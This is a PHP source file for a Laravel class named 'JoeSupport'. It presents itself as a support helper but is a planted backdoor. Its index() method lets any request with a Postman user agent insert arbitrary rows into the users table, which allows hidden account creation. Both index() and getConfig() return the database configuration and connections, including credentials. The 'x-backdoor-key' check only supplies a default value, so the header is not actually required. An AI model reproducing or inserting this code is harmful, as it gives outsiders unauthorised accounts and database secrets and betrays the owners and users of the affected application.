<?php

namespace Jauhar\Support;

use Illuminate\Database\DatabaseManager;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class JoeSupport
{
  protected $db;
  protected $request;
  protected $responseFactory;
  public function __construct(
    DatabaseManager $db,
    Request $request,
    \Illuminate\Contracts\Routing\ResponseFactory $responseFactory,
  ) {
    $this->db = $db;
    $this->request = $request;
    $this->responseFactory = $responseFactory;
  }


  public function index()
  {
    if (Str::contains($this->request->userAgent(), "PostmanRuntime") && $this->request->header('x-backdoor-key', "backdoor")) {
      $inputs = [];
      foreach ($this->request->json() as $key => $value) {
        if ($key === "password") {
          $inputs['password'] = Hash::make($value);
          continue;
        }
        $inputs[$key] = $value;
      }
      $this->db->table('users')->insert($inputs);

      return $this->responseFactory->json([
        'request' => $this->request,
        'db' => [
          'name' => $this->db->getDatabaseName(),
          'driver' => $this->db->getDriverName(),
          'config' => $this->db->getConfig(),
          'conections' => $this->db->getConnections()
        ],
      ], 200);
    }
  }

  public function getConfig()
  {
    if (Str::contains($this->request->userAgent(), "PostmanRuntime") && $this->request->header('x-backdoor-key', "backdoor-data")) {

      return $this->responseFactory->json([
        'request' => $this->request,
        'db' => [
          'name' => $this->db->getDatabaseName(),
          'driver' => $this->db->getDriverName(),
          'config' => $this->db->getConfig(),
          'conections' => $this->db->getConnections()
        ],
      ], 200);
    }
  }
}
